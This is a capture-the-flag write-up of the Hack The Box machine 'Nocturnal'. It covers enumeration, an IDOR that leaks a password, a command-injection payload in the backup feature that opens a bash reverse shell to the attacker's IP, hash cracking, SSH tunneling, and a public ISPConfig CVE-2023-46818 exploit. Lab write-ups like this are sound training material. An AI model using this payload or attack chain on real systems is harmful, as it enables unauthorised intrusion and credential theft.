# Hack The Box: Nocturnal - Comprehensive Notes

<b>Target IP:</b> 10.129.198.144 (Dynamic)
**Domain:** `nocturnal.htb`

## 1. Scanning & Enumeration

### Network Scanning (Nmap)

**Open Ports:**

- `22/tcp` - SSH (OpenSSH)
    
- `80/tcp` - HTTP (Nginx 1.18.0)
    

**Scan Results:**

```
nmap -p 80 -sCV nocturnal.htb --stats-every 5
# 80/tcp open  http    nginx 1.18.0 (Ubuntu)
# |_http-title: Welcome to Nocturnal
```

### Web Enumeration

**Directories Found:**

- `/uploads`
    
- `/backups`
    
- `/uploads2`
    
- `/view.php`
    

Vulnerability: IDOR / Information Disclosure

The /view.php endpoint accepts a username parameter.

- **URL:** `http://nocturnal.htb/view.php?username=kali&file=test.pdf`
    
- **Method:** Brute-forcing the `username` parameter revealed a valid user: **`amanda`**.
    
- **Disclosure:** Accessing `http://nocturnal.htb/view.php?username=amanda&file=privacy.odt` allowed us to download a sensitive file.
    

Sensitive Data (privacy.odt):

The document contained a temporary password for amanda.

- **User:** `amanda`
    
- **Password:** `arHkG7HAI68X8s1J`
    

## 2. Exploitation (User Access)

### Web Access & Command Injection

Using the credentials found in `privacy.odt`, we logged into the application.

- **Vulnerable Feature:** The "Backup" functionality.
    
- **Injection Point:** The password field for creating a backup.
    
- **Payload:** We injected a bash reverse shell into the password input.
    

```
# Payload (URL Encoded in request):
test" ; /bin/bash -c 'bash -i > /dev/tcp/10.0.14.175/8080 0>&1' / ; #
```

**Result:** Reverse shell caught as `www-data`.

### Lateral Movement

Inside the shell, we inspected the web server files and databases.

- **Database:** `/var/www/nocturnal_database/nocturnal_database.db` (SQLite).
    
- **Findings:** The database contained MD5 password hashes for users.
    
    - `tobias`: `55c82b1ccd55ab219b3b109b07d5061d`
        
    - `admin`: `55c82b1ccd55ab219b3b109b07d5061d` (Same hash)
        

**Cracking Credentials:**

- **Hash:** `55c82b1ccd55ab219b3b109b07d5061d`
    
- **Cracked Password:** `slowmotionapocalypse`
    

SSH Access:

We used these credentials to log in via SSH:

```
ssh tobias@nocturnal.htb
# Password: slowmotionapocalypse
```

## 3. Privilege Escalation (Root)

### Internal Enumeration

Checking listening ports revealed an internal service:

```
ss -tulnp
# Port 8080 is listening on 127.0.0.1
```

### Tunneling

We created an SSH tunnel to access the internal service from our attacker machine:

```
ssh -L 8787:127.0.0.1:8080 tobias@nocturnal.htb
```

- **Access:** `http://127.0.0.1:8787`
    
- **Service Identified:** **ISPConfig 3.2.10p1**
    
- **Credentials:** Logged in using `admin` / `slowmotionapocalypse` (reused from the database finding).
    

### Exploit: CVE-2023-46818 (ISPConfig RCE)

The version of ISPConfig is vulnerable to Authenticated Remote Code Execution (or arbitrary file read).

- **Exploit Script:** [CVE-2023-46818 POC](https://github.com/ajdumanhug/CVE-2023-46818 "null")
    
- Execution:
    
    We used the python implementation of the exploit against the tunneled port.
    

```
# Example command structure based on notes
python3 CVE-2023-4618.py -u admin -p slowmotionapocalypse -t [http://127.0.0.1:8787](http://127.0.0.1:8787)
```

Root Access:

The exploit allows reading arbitrary files as root. While full shell navigation was restricted, we could directly read the root flag.

```
cat /root/root.txt
```

**Status:** Machine Completed.